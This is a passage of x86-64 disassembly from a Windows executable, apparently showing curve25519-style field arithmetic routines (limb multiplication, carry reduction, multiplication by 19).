   1400022a4:	49 63 4b 08          	movslq 0x8(%r11),%rcx
   1400022a8:	48 0f af c8          	imul   %rax,%rcx
   1400022ac:	49 63 43 28          	movslq 0x28(%r11),%rax
   1400022b0:	48 03 d1             	add    %rcx,%rdx
   1400022b3:	49 63 4a 08          	movslq 0x8(%r10),%rcx
   1400022b7:	48 0f af c8          	imul   %rax,%rcx
   1400022bb:	49 63 02             	movslq (%r10),%rax
   1400022be:	48 03 d1             	add    %rcx,%rdx
   1400022c1:	49 63 4b 30          	movslq 0x30(%r11),%rcx
   1400022c5:	48 0f af c8          	imul   %rax,%rcx
   1400022c9:	49 63 43 20          	movslq 0x20(%r11),%rax
   1400022cd:	48 8d 14 51          	lea    (%rcx,%rdx,2),%rdx
   1400022d1:	49 63 4a 10          	movslq 0x10(%r10),%rcx
   1400022d5:	48 0f af c8          	imul   %rax,%rcx
   1400022d9:	49 63 42 20          	movslq 0x20(%r10),%rax
   1400022dd:	48 03 d1             	add    %rcx,%rdx
   1400022e0:	49 63 4b 10          	movslq 0x10(%r11),%rcx
   1400022e4:	48 0f af c8          	imul   %rax,%rcx
   1400022e8:	49 63 03             	movslq (%r11),%rax
   1400022eb:	48 03 d1             	add    %rcx,%rdx
   1400022ee:	49 63 4a 30          	movslq 0x30(%r10),%rcx
   1400022f2:	48 0f af c8          	imul   %rax,%rcx
   1400022f6:	48 03 d1             	add    %rcx,%rdx
   1400022f9:	48 89 53 30          	mov    %rdx,0x30(%rbx)
   1400022fd:	49 63 43 18          	movslq 0x18(%r11),%rax
   140002301:	49 63 52 20          	movslq 0x20(%r10),%rdx
   140002305:	49 63 4b 08          	movslq 0x8(%r11),%rcx
   140002309:	48 0f af d0          	imul   %rax,%rdx
   14000230d:	49 63 42 30          	movslq 0x30(%r10),%rax
   140002311:	48 0f af c8          	imul   %rax,%rcx
   140002315:	49 63 43 10          	movslq 0x10(%r11),%rax
   140002319:	48 03 d1             	add    %rcx,%rdx
   14000231c:	49 63 4a 28          	movslq 0x28(%r10),%rcx
   140002320:	48 0f af c8          	imul   %rax,%rcx
   140002324:	49 63 43 30          	movslq 0x30(%r11),%rax
   140002328:	48 03 d1             	add    %rcx,%rdx
   14000232b:	49 63 4a 08          	movslq 0x8(%r10),%rcx
   14000232f:	48 0f af c8          	imul   %rax,%rcx
   140002333:	49 63 42 38          	movslq 0x38(%r10),%rax
   140002337:	48 03 d1             	add    %rcx,%rdx
   14000233a:	49 63 0b             	movslq (%r11),%rcx
   14000233d:	48 0f af c8          	imul   %rax,%rcx
   140002341:	49 63 43 28          	movslq 0x28(%r11),%rax
   140002345:	48 03 d1             	add    %rcx,%rdx
   140002348:	49 63 4a 10          	movslq 0x10(%r10),%rcx
   14000234c:	48 0f af c8          	imul   %rax,%rcx
   140002350:	49 63 42 18          	movslq 0x18(%r10),%rax
   140002354:	48 03 d1             	add    %rcx,%rdx
   140002357:	49 63 4b 20          	movslq 0x20(%r11),%rcx
   14000235b:	48 0f af c8          	imul   %rax,%rcx
   14000235f:	49 63 02             	movslq (%r10),%rax
   140002362:	48 03 d1             	add    %rcx,%rdx
   140002365:	49 63 4b 38          	movslq 0x38(%r11),%rcx
   140002369:	48 0f af c8          	imul   %rax,%rcx
   14000236d:	48 03 d1             	add    %rcx,%rdx
   140002370:	48 89 53 38          	mov    %rdx,0x38(%rbx)
   140002374:	49 63 43 28          	movslq 0x28(%r11),%rax
   140002378:	49 63 52 18          	movslq 0x18(%r10),%rdx
   14000237c:	49 63 4b 08          	movslq 0x8(%r11),%rcx
   140002380:	48 0f af d0          	imul   %rax,%rdx
   140002384:	49 63 42 38          	movslq 0x38(%r10),%rax
   140002388:	48 0f af c8          	imul   %rax,%rcx
   14000238c:	49 63 42 08          	movslq 0x8(%r10),%rax
   140002390:	48 03 d1             	add    %rcx,%rdx
   140002393:	49 63 4b 38          	movslq 0x38(%r11),%rcx
   140002397:	48 0f af c8          	imul   %rax,%rcx
   14000239b:	49 63 43 18          	movslq 0x18(%r11),%rax
   14000239f:	48 03 d1             	add    %rcx,%rdx
   1400023a2:	49 63 4a 28          	movslq 0x28(%r10),%rcx
   1400023a6:	48 0f af c8          	imul   %rax,%rcx
   1400023aa:	48 03 d1             	add    %rcx,%rdx
   1400023ad:	49 63 42 30          	movslq 0x30(%r10),%rax
   1400023b1:	49 63 4b 10          	movslq 0x10(%r11),%rcx
   1400023b5:	48 0f af c8          	imul   %rax,%rcx
   1400023b9:	49 63 03             	movslq (%r11),%rax
   1400023bc:	48 8d 14 51          	lea    (%rcx,%rdx,2),%rdx
   1400023c0:	49 63 4a 40          	movslq 0x40(%r10),%rcx
   1400023c4:	48 0f af c8          	imul   %rax,%rcx
   1400023c8:	49 63 43 40          	movslq 0x40(%r11),%rax
   1400023cc:	48 03 d1             	add    %rcx,%rdx
   1400023cf:	49 63 0a             	movslq (%r10),%rcx
   1400023d2:	48 0f af c8          	imul   %rax,%rcx
   1400023d6:	49 63 43 30          	movslq 0x30(%r11),%rax
   1400023da:	48 03 d1             	add    %rcx,%rdx
   1400023dd:	49 63 4a 10          	movslq 0x10(%r10),%rcx
   1400023e1:	48 0f af c8          	imul   %rax,%rcx
   1400023e5:	49 63 42 20          	movslq 0x20(%r10),%rax
   1400023e9:	48 03 d1             	add    %rcx,%rdx
   1400023ec:	49 63 4b 20          	movslq 0x20(%r11),%rcx
   1400023f0:	48 0f af c8          	imul   %rax,%rcx
   1400023f4:	48 03 d1             	add    %rcx,%rdx
   1400023f7:	48 89 53 40          	mov    %rdx,0x40(%rbx)
   1400023fb:	49 63 42 18          	movslq 0x18(%r10),%rax
   1400023ff:	49 63 53 30          	movslq 0x30(%r11),%rdx
   140002403:	49 63 4a 20          	movslq 0x20(%r10),%rcx
   140002407:	48 0f af d0          	imul   %rax,%rdx
   14000240b:	49 63 43 28          	movslq 0x28(%r11),%rax
   14000240f:	48 0f af c8          	imul   %rax,%rcx
   140002413:	49 63 42 10          	movslq 0x10(%r10),%rax
   140002417:	48 03 d1             	add    %rcx,%rdx
   14000241a:	49 63 4b 38          	movslq 0x38(%r11),%rcx
   14000241e:	48 0f af c8          	imul   %rax,%rcx
   140002422:	49 63 43 40          	movslq 0x40(%r11),%rax
   140002426:	48 03 d1             	add    %rcx,%rdx
   140002429:	49 63 4a 08          	movslq 0x8(%r10),%rcx
   14000242d:	48 0f af c8          	imul   %rax,%rcx
   140002431:	49 63 42 40          	movslq 0x40(%r10),%rax
   140002435:	48 03 d1             	add    %rcx,%rdx
   140002438:	49 63 4b 08          	movslq 0x8(%r11),%rcx
   14000243c:	48 0f af c8          	imul   %rax,%rcx
   140002440:	49 63 43 20          	movslq 0x20(%r11),%rax
   140002444:	48 03 d1             	add    %rcx,%rdx
   140002447:	49 63 4a 28          	movslq 0x28(%r10),%rcx
   14000244b:	48 0f af c8          	imul   %rax,%rcx
   14000244f:	49 63 03             	movslq (%r11),%rax
   140002452:	48 03 d1             	add    %rcx,%rdx
   140002455:	49 63 4a 48          	movslq 0x48(%r10),%rcx
   140002459:	48 0f af c8          	imul   %rax,%rcx
   14000245d:	49 63 42 30          	movslq 0x30(%r10),%rax
   140002461:	48 03 d1             	add    %rcx,%rdx
   140002464:	49 63 4b 18          	movslq 0x18(%r11),%rcx
   140002468:	48 0f af c8          	imul   %rax,%rcx
   14000246c:	49 63 02             	movslq (%r10),%rax
   14000246f:	48 03 d1             	add    %rcx,%rdx
   140002472:	49 63 4b 48          	movslq 0x48(%r11),%rcx
   140002476:	48 0f af c8          	imul   %rax,%rcx
   14000247a:	49 63 42 38          	movslq 0x38(%r10),%rax
   14000247e:	48 03 d1             	add    %rcx,%rdx
   140002481:	49 63 4b 10          	movslq 0x10(%r11),%rcx
   140002485:	48 0f af c8          	imul   %rax,%rcx
   140002489:	48 03 d1             	add    %rcx,%rdx
   14000248c:	48 89 53 48          	mov    %rdx,0x48(%rbx)
   140002490:	49 63 43 18          	movslq 0x18(%r11),%rax
   140002494:	49 63 52 38          	movslq 0x38(%r10),%rdx
   140002498:	49 63 4a 48          	movslq 0x48(%r10),%rcx
   14000249c:	48 0f af d0          	imul   %rax,%rdx
   1400024a0:	49 63 43 08          	movslq 0x8(%r11),%rax
   1400024a4:	48 0f af c8          	imul   %rax,%rcx
   1400024a8:	49 63 43 48          	movslq 0x48(%r11),%rax
   1400024ac:	48 03 d1             	add    %rcx,%rdx
   1400024af:	49 63 4a 08          	movslq 0x8(%r10),%rcx
   1400024b3:	48 0f af c8          	imul   %rax,%rcx
   1400024b7:	49 63 42 18          	movslq 0x18(%r10),%rax
   1400024bb:	48 03 d1             	add    %rcx,%rdx
   1400024be:	49 63 4b 38          	movslq 0x38(%r11),%rcx
   1400024c2:	48 0f af c8          	imul   %rax,%rcx
   1400024c6:	49 63 43 28          	movslq 0x28(%r11),%rax
   1400024ca:	48 03 d1             	add    %rcx,%rdx
   1400024cd:	49 63 4a 28          	movslq 0x28(%r10),%rcx
   1400024d1:	48 0f af c8          	imul   %rax,%rcx
   1400024d5:	48 03 d1             	add    %rcx,%rdx
   1400024d8:	49 63 4a 20          	movslq 0x20(%r10),%rcx
   1400024dc:	49 63 43 30          	movslq 0x30(%r11),%rax
   1400024e0:	48 0f af c8          	imul   %rax,%rcx
   1400024e4:	49 63 42 10          	movslq 0x10(%r10),%rax
   1400024e8:	48 8d 14 51          	lea    (%rcx,%rdx,2),%rdx
   1400024ec:	49 63 4b 40          	movslq 0x40(%r11),%rcx
   1400024f0:	48 0f af c8          	imul   %rax,%rcx
   1400024f4:	49 63 42 30          	movslq 0x30(%r10),%rax
   1400024f8:	48 03 d1             	add    %rcx,%rdx
   1400024fb:	49 63 4b 20          	movslq 0x20(%r11),%rcx
   1400024ff:	48 0f af c8          	imul   %rax,%rcx
   140002503:	49 63 42 40          	movslq 0x40(%r10),%rax
   140002507:	48 03 d1             	add    %rcx,%rdx
   14000250a:	49 63 4b 10          	movslq 0x10(%r11),%rcx
   14000250e:	48 0f af c8          	imul   %rax,%rcx
   140002512:	48 03 d1             	add    %rcx,%rdx
   140002515:	48 89 53 50          	mov    %rdx,0x50(%rbx)
   140002519:	49 63 43 10          	movslq 0x10(%r11),%rax
   14000251d:	49 63 52 48          	movslq 0x48(%r10),%rdx
   140002521:	49 63 4b 38          	movslq 0x38(%r11),%rcx
   140002525:	48 0f af d0          	imul   %rax,%rdx
   140002529:	49 63 42 20          	movslq 0x20(%r10),%rax
   14000252d:	48 0f af c8          	imul   %rax,%rcx
   140002531:	49 63 42 30          	movslq 0x30(%r10),%rax
   140002535:	48 03 d1             	add    %rcx,%rdx
   140002538:	49 63 4b 28          	movslq 0x28(%r11),%rcx
   14000253c:	48 0f af c8          	imul   %rax,%rcx
   140002540:	49 63 42 40          	movslq 0x40(%r10),%rax
   140002544:	48 03 d1             	add    %rcx,%rdx
   140002547:	49 63 4b 18          	movslq 0x18(%r11),%rcx
   14000254b:	48 0f af c8          	imul   %rax,%rcx
   14000254f:	49 63 43 30          	movslq 0x30(%r11),%rax
   140002553:	48 03 d1             	add    %rcx,%rdx
   140002556:	49 63 4a 28          	movslq 0x28(%r10),%rcx
   14000255a:	48 0f af c8          	imul   %rax,%rcx
   14000255e:	49 63 42 18          	movslq 0x18(%r10),%rax
   140002562:	48 03 d1             	add    %rcx,%rdx
   140002565:	49 63 4b 40          	movslq 0x40(%r11),%rcx
   140002569:	48 0f af c8          	imul   %rax,%rcx
   14000256d:	49 63 43 48          	movslq 0x48(%r11),%rax
   140002571:	48 03 d1             	add    %rcx,%rdx
   140002574:	49 63 4a 10          	movslq 0x10(%r10),%rcx
   140002578:	48 0f af c8          	imul   %rax,%rcx
   14000257c:	49 63 42 38          	movslq 0x38(%r10),%rax
   140002580:	48 03 d1             	add    %rcx,%rdx
   140002583:	49 63 4b 20          	movslq 0x20(%r11),%rcx
   140002587:	48 0f af c8          	imul   %rax,%rcx
   14000258b:	48 03 d1             	add    %rcx,%rdx
   14000258e:	48 89 53 58          	mov    %rdx,0x58(%rbx)
   140002592:	49 63 42 18          	movslq 0x18(%r10),%rax
   140002596:	49 63 53 48          	movslq 0x48(%r11),%rdx
   14000259a:	49 63 4b 38          	movslq 0x38(%r11),%rcx
   14000259e:	48 0f af d0          	imul   %rax,%rdx
   1400025a2:	49 63 42 28          	movslq 0x28(%r10),%rax
   1400025a6:	48 0f af c8          	imul   %rax,%rcx
   1400025aa:	49 63 43 28          	movslq 0x28(%r11),%rax
   1400025ae:	48 03 d1             	add    %rcx,%rdx
   1400025b1:	49 63 4a 38          	movslq 0x38(%r10),%rcx
   1400025b5:	48 0f af c8          	imul   %rax,%rcx
   1400025b9:	49 63 43 18          	movslq 0x18(%r11),%rax
   1400025bd:	48 03 d1             	add    %rcx,%rdx
   1400025c0:	49 63 4a 48          	movslq 0x48(%r10),%rcx
   1400025c4:	48 0f af c8          	imul   %rax,%rcx
   1400025c8:	49 63 42 40          	movslq 0x40(%r10),%rax
   1400025cc:	48 03 d1             	add    %rcx,%rdx
   1400025cf:	49 63 4b 20          	movslq 0x20(%r11),%rcx
   1400025d3:	48 0f af c8          	imul   %rax,%rcx
   1400025d7:	49 63 42 30          	movslq 0x30(%r10),%rax
   1400025db:	48 8d 14 51          	lea    (%rcx,%rdx,2),%rdx
   1400025df:	49 63 4b 30          	movslq 0x30(%r11),%rcx
   1400025e3:	48 0f af c8          	imul   %rax,%rcx
   1400025e7:	49 63 42 20          	movslq 0x20(%r10),%rax
   1400025eb:	48 03 d1             	add    %rcx,%rdx
   1400025ee:	49 63 4b 40          	movslq 0x40(%r11),%rcx
   1400025f2:	48 0f af c8          	imul   %rax,%rcx
   1400025f6:	48 03 d1             	add    %rcx,%rdx
   1400025f9:	48 89 53 60          	mov    %rdx,0x60(%rbx)
   1400025fd:	49 63 42 30          	movslq 0x30(%r10),%rax
   140002601:	49 63 53 38          	movslq 0x38(%r11),%rdx
   140002605:	49 63 4b 48          	movslq 0x48(%r11),%rcx
   140002609:	48 0f af d0          	imul   %rax,%rdx
   14000260d:	49 63 42 20          	movslq 0x20(%r10),%rax
   140002611:	48 0f af c8          	imul   %rax,%rcx
   140002615:	49 63 43 30          	movslq 0x30(%r11),%rax
   140002619:	48 03 d1             	add    %rcx,%rdx
   14000261c:	49 63 4a 38          	movslq 0x38(%r10),%rcx
   140002620:	48 0f af c8          	imul   %rax,%rcx
   140002624:	49 63 43 20          	movslq 0x20(%r11),%rax
   140002628:	48 03 d1             	add    %rcx,%rdx
   14000262b:	49 63 4a 48          	movslq 0x48(%r10),%rcx
   14000262f:	48 0f af c8          	imul   %rax,%rcx
   140002633:	49 63 42 28          	movslq 0x28(%r10),%rax
   140002637:	48 03 d1             	add    %rcx,%rdx
   14000263a:	49 63 4b 40          	movslq 0x40(%r11),%rcx
   14000263e:	48 0f af c8          	imul   %rax,%rcx
   140002642:	49 63 42 40          	movslq 0x40(%r10),%rax
   140002646:	48 03 d1             	add    %rcx,%rdx
   140002649:	49 63 4b 28          	movslq 0x28(%r11),%rcx
   14000264d:	48 0f af c8          	imul   %rax,%rcx
   140002651:	48 03 d1             	add    %rcx,%rdx
   140002654:	48 89 53 68          	mov    %rdx,0x68(%rbx)
   140002658:	49 63 42 38          	movslq 0x38(%r10),%rax
   14000265c:	49 63 53 38          	movslq 0x38(%r11),%rdx
   140002660:	49 63 4a 48          	movslq 0x48(%r10),%rcx
   140002664:	48 0f af d0          	imul   %rax,%rdx
   140002668:	49 63 43 28          	movslq 0x28(%r11),%rax
   14000266c:	48 0f af c8          	imul   %rax,%rcx
   140002670:	49 63 43 48          	movslq 0x48(%r11),%rax
   140002674:	48 03 d1             	add    %rcx,%rdx
   140002677:	49 63 4a 28          	movslq 0x28(%r10),%rcx
   14000267b:	48 0f af c8          	imul   %rax,%rcx
   14000267f:	49 63 42 30          	movslq 0x30(%r10),%rax
   140002683:	48 03 d1             	add    %rcx,%rdx
   140002686:	49 63 4b 40          	movslq 0x40(%r11),%rcx
   14000268a:	48 0f af c8          	imul   %rax,%rcx
   14000268e:	49 63 42 40          	movslq 0x40(%r10),%rax
   140002692:	48 8d 14 51          	lea    (%rcx,%rdx,2),%rdx
   140002696:	49 63 4b 30          	movslq 0x30(%r11),%rcx
   14000269a:	48 0f af c8          	imul   %rax,%rcx
   14000269e:	48 03 d1             	add    %rcx,%rdx
   1400026a1:	48 89 53 70          	mov    %rdx,0x70(%rbx)
   1400026a5:	49 63 42 40          	movslq 0x40(%r10),%rax
   1400026a9:	49 63 53 38          	movslq 0x38(%r11),%rdx
   1400026ad:	49 63 4b 48          	movslq 0x48(%r11),%rcx
   1400026b1:	48 0f af d0          	imul   %rax,%rdx
   1400026b5:	49 63 42 30          	movslq 0x30(%r10),%rax
   1400026b9:	48 0f af c8          	imul   %rax,%rcx
   1400026bd:	49 63 43 30          	movslq 0x30(%r11),%rax
   1400026c1:	48 03 d1             	add    %rcx,%rdx
   1400026c4:	49 63 4a 48          	movslq 0x48(%r10),%rcx
   1400026c8:	48 0f af c8          	imul   %rax,%rcx
   1400026cc:	49 63 42 38          	movslq 0x38(%r10),%rax
   1400026d0:	48 03 d1             	add    %rcx,%rdx
   1400026d3:	49 63 4b 40          	movslq 0x40(%r11),%rcx
   1400026d7:	48 0f af c8          	imul   %rax,%rcx
   1400026db:	48 03 d1             	add    %rcx,%rdx
   1400026de:	48 89 53 78          	mov    %rdx,0x78(%rbx)
   1400026e2:	49 63 43 48          	movslq 0x48(%r11),%rax
   1400026e6:	49 63 52 38          	movslq 0x38(%r10),%rdx
   1400026ea:	49 63 4a 48          	movslq 0x48(%r10),%rcx
   1400026ee:	48 0f af d0          	imul   %rax,%rdx
   1400026f2:	49 63 43 38          	movslq 0x38(%r11),%rax
   1400026f6:	48 0f af c8          	imul   %rax,%rcx
   1400026fa:	49 63 42 40          	movslq 0x40(%r10),%rax
   1400026fe:	48 03 d1             	add    %rcx,%rdx
   140002701:	49 63 4b 40          	movslq 0x40(%r11),%rcx
   140002705:	48 0f af c8          	imul   %rax,%rcx
   140002709:	48 8d 04 51          	lea    (%rcx,%rdx,2),%rax
   14000270d:	48 89 83 80 00 00 00 	mov    %rax,0x80(%rbx)
   140002714:	49 63 43 40          	movslq 0x40(%r11),%rax
   140002718:	49 63 52 48          	movslq 0x48(%r10),%rdx
   14000271c:	49 63 4b 48          	movslq 0x48(%r11),%rcx
   140002720:	48 0f af d0          	imul   %rax,%rdx
   140002724:	49 63 42 40          	movslq 0x40(%r10),%rax
   140002728:	48 0f af c8          	imul   %rax,%rcx
   14000272c:	48 03 d1             	add    %rcx,%rdx
   14000272f:	48 89 93 88 00 00 00 	mov    %rdx,0x88(%rbx)
   140002736:	49 63 4a 48          	movslq 0x48(%r10),%rcx
   14000273a:	49 63 43 48          	movslq 0x48(%r11),%rax
   14000273e:	48 0f af c8          	imul   %rax,%rcx
   140002742:	48 03 c9             	add    %rcx,%rcx
   140002745:	48 89 8b 90 00 00 00 	mov    %rcx,0x90(%rbx)
   14000274c:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140002751:	c3                   	ret
   140002752:	cc                   	int3
   140002753:	cc                   	int3
   140002754:	cc                   	int3
   140002755:	cc                   	int3
   140002756:	cc                   	int3
   140002757:	cc                   	int3
   140002758:	cc                   	int3
   140002759:	cc                   	int3
   14000275a:	cc                   	int3
   14000275b:	cc                   	int3
   14000275c:	cc                   	int3
   14000275d:	cc                   	int3
   14000275e:	cc                   	int3
   14000275f:	cc                   	int3
   140002760:	45 33 db             	xor    %r11d,%r11d
   140002763:	4c 8d 49 10          	lea    0x10(%rcx),%r9
   140002767:	4c 89 59 50          	mov    %r11,0x50(%rcx)
   14000276b:	4c 8b c1             	mov    %rcx,%r8
   14000276e:	41 ba 05 00 00 00    	mov    $0x5,%r10d
   140002774:	0f 1f 40 00          	nopl   0x0(%rax)
   140002778:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000277f:	00 
   140002780:	49 8b 51 f0          	mov    -0x10(%r9),%rdx
   140002784:	4d 8d 49 10          	lea    0x10(%r9),%r9
   140002788:	48 8b ca             	mov    %rdx,%rcx
   14000278b:	48 c1 e9 20          	shr    $0x20,%rcx
   14000278f:	c1 f9 1f             	sar    $0x1f,%ecx
   140002792:	48 c1 e9 06          	shr    $0x6,%rcx
   140002796:	48 03 ca             	add    %rdx,%rcx
   140002799:	48 c1 f9 1a          	sar    $0x1a,%rcx
   14000279d:	48 8b c1             	mov    %rcx,%rax
   1400027a0:	48 c1 e0 1a          	shl    $0x1a,%rax
   1400027a4:	48 2b d0             	sub    %rax,%rdx
   1400027a7:	49 89 51 e0          	mov    %rdx,-0x20(%r9)
   1400027ab:	49 8b 51 e8          	mov    -0x18(%r9),%rdx
   1400027af:	48 03 d1             	add    %rcx,%rdx
   1400027b2:	48 8b ca             	mov    %rdx,%rcx
   1400027b5:	48 c1 e9 20          	shr    $0x20,%rcx
   1400027b9:	c1 f9 1f             	sar    $0x1f,%ecx
   1400027bc:	48 c1 e9 07          	shr    $0x7,%rcx
   1400027c0:	48 03 ca             	add    %rdx,%rcx
   1400027c3:	48 c1 f9 19          	sar    $0x19,%rcx
   1400027c7:	49 01 49 f0          	add    %rcx,-0x10(%r9)
   1400027cb:	48 8b c1             	mov    %rcx,%rax
   1400027ce:	48 c1 e0 19          	shl    $0x19,%rax
   1400027d2:	48 2b d0             	sub    %rax,%rdx
   1400027d5:	49 89 51 e8          	mov    %rdx,-0x18(%r9)
   1400027d9:	49 83 ea 01          	sub    $0x1,%r10
   1400027dd:	75 a1                	jne    0x140002780
   1400027df:	49 6b 50 50 13       	imul   $0x13,0x50(%r8),%rdx
   1400027e4:	4d 89 58 50          	mov    %r11,0x50(%r8)
   1400027e8:	49 03 10             	add    (%r8),%rdx
   1400027eb:	48 8b ca             	mov    %rdx,%rcx
   1400027ee:	48 c1 e9 20          	shr    $0x20,%rcx
   1400027f2:	c1 f9 1f             	sar    $0x1f,%ecx
   1400027f5:	48 c1 e9 06          	shr    $0x6,%rcx
   1400027f9:	48 03 ca             	add    %rdx,%rcx
   1400027fc:	48 c1 f9 1a          	sar    $0x1a,%rcx
   140002800:	49 01 48 08          	add    %rcx,0x8(%r8)
   140002804:	48 8b c1             	mov    %rcx,%rax
   140002807:	48 c1 e0 1a          	shl    $0x1a,%rax
   14000280b:	48 2b d0             	sub    %rax,%rdx
   14000280e:	49 89 10             	mov    %rdx,(%r8)
   140002811:	c3                   	ret
   140002812:	cc                   	int3
   140002813:	cc                   	int3
   140002814:	cc                   	int3
   140002815:	cc                   	int3
   140002816:	cc                   	int3
   140002817:	cc                   	int3
   140002818:	cc                   	int3
   140002819:	cc                   	int3
   14000281a:	cc                   	int3
   14000281b:	cc                   	int3
   14000281c:	cc                   	int3
   14000281d:	cc                   	int3
   14000281e:	cc                   	int3
   14000281f:	cc                   	int3
   140002820:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002825:	55                   	push   %rbp
   140002826:	48 8d 6c 24 a9       	lea    -0x57(%rsp),%rbp
   14000282b:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   140002832:	48 8b 05 c7 87 00 00 	mov    0x87c7(%rip),%rax        # 0x14000b000
   140002839:	48 33 c4             	xor    %rsp,%rax
   14000283c:	48 89 45 47          	mov    %rax,0x47(%rbp)
   140002840:	48 8b d9             	mov    %rcx,%rbx
   140002843:	48 8d 4d a7          	lea    -0x59(%rbp),%rcx
   140002847:	e8 04 f9 ff ff       	call   0x140002150
   14000284c:	48 6b 45 37 13       	imul   $0x13,0x37(%rbp),%rax
   140002851:	4c 8d 45 b7          	lea    -0x49(%rbp),%r8
   140002855:	41 b9 05 00 00 00    	mov    $0x5,%r9d
   14000285b:	48 01 45 e7          	add    %rax,-0x19(%rbp)
   14000285f:	48 6b 45 2f 13       	imul   $0x13,0x2f(%rbp),%rax
   140002864:	48 01 45 df          	add    %rax,-0x21(%rbp)
   140002868:	48 6b 45 27 13       	imul   $0x13,0x27(%rbp),%rax
   14000286d:	48 01 45 d7          	add    %rax,-0x29(%rbp)
   140002871:	48 6b 45 1f 13       	imul   $0x13,0x1f(%rbp),%rax
   140002876:	48 01 45 cf          	add    %rax,-0x31(%rbp)
   14000287a:	48 6b 45 17 13       	imul   $0x13,0x17(%rbp),%rax
   14000287f:	48 01 45 c7          	add    %rax,-0x39(%rbp)
   140002883:	48 6b 45 0f 13       	imul   $0x13,0xf(%rbp),%rax
   140002888:	48 01 45 bf          	add    %rax,-0x41(%rbp)
   14000288c:	48 6b 45 07 13       	imul   $0x13,0x7(%rbp),%rax
   140002891:	48 01 45 b7          	add    %rax,-0x49(%rbp)
   140002895:	48 6b 45 ff 13       	imul   $0x13,-0x1(%rbp),%rax
   14000289a:	48 01 45 af          	add    %rax,-0x51(%rbp)
   14000289e:	48 6b 45 f7 13       	imul   $0x13,-0x9(%rbp),%rax
   1400028a3:	48 01 45 a7          	add    %rax,-0x59(%rbp)
   1400028a7:	45 33 d2             	xor    %r10d,%r10d
   1400028aa:	4c 89 55 f7          	mov    %r10,-0x9(%rbp)
   1400028ae:	66 90                	xchg   %ax,%ax
   1400028b0:	49 8b 50 f0          	mov    -0x10(%r8),%rdx
   1400028b4:	4d 8d 40 10          	lea    0x10(%r8),%r8
   1400028b8:	48 8b ca             	mov    %rdx,%rcx
   1400028bb:	48 c1 e9 20          	shr    $0x20,%rcx
   1400028bf:	c1 f9 1f             	sar    $0x1f,%ecx
   1400028c2:	48 c1 e9 06          	shr    $0x6,%rcx
   1400028c6:	48 03 ca             	add    %rdx,%rcx
   1400028c9:	48 c1 f9 1a          	sar    $0x1a,%rcx
   1400028cd:	48 8b c1             	mov    %rcx,%rax
   1400028d0:	48 c1 e0 1a          	shl    $0x1a,%rax
   1400028d4:	48 2b d0             	sub    %rax,%rdx
   1400028d7:	49 89 50 e0          	mov    %rdx,-0x20(%r8)
   1400028db:	49 8b 50 e8          	mov    -0x18(%r8),%rdx
   1400028df:	48 03 d1             	add    %rcx,%rdx
   1400028e2:	48 8b ca             	mov    %rdx,%rcx
   1400028e5:	48 c1 e9 20          	shr    $0x20,%rcx
   1400028e9:	c1 f9 1f             	sar    $0x1f,%ecx
   1400028ec:	48 c1 e9 07          	shr    $0x7,%rcx
   1400028f0:	48 03 ca             	add    %rdx,%rcx
   1400028f3:	48 c1 f9 19          	sar    $0x19,%rcx
   1400028f7:	49 01 48 f0          	add    %rcx,-0x10(%r8)
   1400028fb:	48 8b c1             	mov    %rcx,%rax
   1400028fe:	48 c1 e0 19          	shl    $0x19,%rax
   140002902:	48 2b d0             	sub    %rax,%rdx
   140002905:	49 89 50 e8          	mov    %rdx,-0x18(%r8)
   140002909:	49 83 e9 01          	sub    $0x1,%r9
   14000290d:	75 a1                	jne    0x1400028b0
   14000290f:	48 6b 55 f7 13       	imul   $0x13,-0x9(%rbp),%rdx
   140002914:	4c 89 55 f7          	mov    %r10,-0x9(%rbp)
   140002918:	48 03 55 a7          	add    -0x59(%rbp),%rdx
   14000291c:	48 8b ca             	mov    %rdx,%rcx
   14000291f:	48 c1 e9 20          	shr    $0x20,%rcx
   140002923:	c1 f9 1f             	sar    $0x1f,%ecx
   140002926:	48 c1 e9 06          	shr    $0x6,%rcx
   14000292a:	48 03 ca             	add    %rdx,%rcx
   14000292d:	48 c1 f9 1a          	sar    $0x1a,%rcx
   140002931:	48 8b c1             	mov    %rcx,%rax
   140002934:	48 c1 e0 1a          	shl    $0x1a,%rax
   140002938:	48 2b d0             	sub    %rax,%rdx
   14000293b:	48 01 4d af          	add    %rcx,-0x51(%rbp)
   14000293f:	48 89 55 a7          	mov    %rdx,-0x59(%rbp)
   140002943:	44 89 55 97          	mov    %r10d,-0x69(%rbp)
   140002947:	8b 45 97             	mov    -0x69(%rbp),%eax
   14000294a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002950:	48 63 45 97          	movslq -0x69(%rbp),%rax
   140002954:	48 8d 55 a7          	lea    -0x59(%rbp),%rdx
   140002958:	48 63 4d 97          	movslq -0x69(%rbp),%rcx
   14000295c:	0f b6 04 02          	movzbl (%rdx,%rax,1),%eax
   140002960:	88 04 19             	mov    %al,(%rcx,%rbx,1)
   140002963:	8b 45 97             	mov    -0x69(%rbp),%eax
   140002966:	ff c0                	inc    %eax
   140002968:	89 45 97             	mov    %eax,-0x69(%rbp)
   14000296b:	8b 45 97             	mov    -0x69(%rbp),%eax
   14000296e:	83 f8 50             	cmp    $0x50,%eax
   140002971:	72 dd                	jb     0x140002950
   140002973:	48 8b 4d 47          	mov    0x47(%rbp),%rcx
   140002977:	48 33 cc             	xor    %rsp,%rcx
   14000297a:	e8 61 70 00 00       	call   0x1400099e0
   14000297f:	48 8b 9c 24 08 01 00 	mov    0x108(%rsp),%rbx
   140002986:	00 
   140002987:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   14000298e:	5d                   	pop    %rbp
   14000298f:	c3                   	ret
   140002990:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002995:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000299a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000299f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400029a4:	41 54                	push   %r12
   1400029a6:	41 55                	push   %r13
   1400029a8:	41 56                	push   %r14
   1400029aa:	41 57                	push   %r15
   1400029ac:	4c 63 02             	movslq (%rdx),%r8
   1400029af:	4c 8b e9             	mov    %rcx,%r13
   1400029b2:	4c 63 52 08          	movslq 0x8(%rdx),%r10
   1400029b6:	4c 8b fa             	mov    %rdx,%r15
   1400029b9:	48 63 7a 10          	movslq 0x10(%rdx),%rdi
